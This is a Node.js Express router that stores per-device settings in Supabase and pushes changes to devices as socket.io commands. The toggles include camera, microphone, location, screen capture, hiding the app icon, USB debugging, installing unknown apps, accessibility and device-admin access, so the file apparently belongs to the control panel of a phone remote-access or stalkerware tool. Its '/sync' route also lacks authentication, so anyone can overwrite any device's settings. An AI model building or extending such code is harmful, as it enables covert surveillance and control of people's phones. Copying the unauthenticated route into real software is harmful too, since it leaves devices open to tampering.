const router = require('express').Router();
const { supabase } = require('../config/supabase');
const { auth } = require('../middleware/auth');

// Get device settings
router.get('/:deviceId', auth, async (req, res) => {
  try {
    let { data, error } = await supabase
      .from('device_settings')
      .select('*')
      .eq('device_id', req.params.deviceId)
      .single();

    if (error && error.code === 'PGRST116') {
      const { data: created, error: createErr } = await supabase
        .from('device_settings')
        .upsert({ device_id: req.params.deviceId, updated_at: new Date().toISOString() }, { onConflict: 'device_id' })
        .select()
        .single();
      if (createErr) {
        data = { device_id: req.params.deviceId, camera_enabled: 1, microphone_enabled: 1, location_enabled: 1, bluetooth_enabled: 1, wifi_enabled: 1, mobile_data_enabled: 1, icon_hidden: 0, screen_capture_enabled: 1 };
      } else {
        data = created;
      }
    } else if (error) throw error;

    res.json(data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// Update device settings
router.put('/:deviceId', auth, async (req, res) => {
  try {
    const updates = {};
    const allowed = ['camera_enabled', 'microphone_enabled', 'location_enabled', 'bluetooth_enabled',
      'wifi_enabled', 'mobile_data_enabled', 'icon_hidden', 'usb_debugging_enabled',
      'install_unknown_apps', 'screen_capture_enabled', 'notification_access',
      'accessibility_enabled', 'device_admin_enabled'];
    for (const key of allowed) {
      if (req.body[key] !== undefined) updates[key] = req.body[key];
    }
    updates.updated_at = new Date();

    const { data, error } = await supabase
      .from('device_settings')
      .update(updates)
      .eq('device_id', req.params.deviceId)
      .select()
      .single();
    if (error) throw error;

    const io = req.app.get('io');
    if (io) io.to(`device:${req.params.deviceId}`).emit('command', { command: 'update_settings', params: updates });
    res.json(data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// Device syncs its settings
router.post('/sync', async (req, res) => {
  try {
    const { deviceId, settings } = req.body;
    const { data, error } = await supabase
      .from('device_settings')
      .upsert({ device_id: deviceId, ...settings, updated_at: new Date() }, { onConflict: 'device_id' })
      .select()
      .single();
    if (error) throw error;
    res.json(data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

module.exports = router;
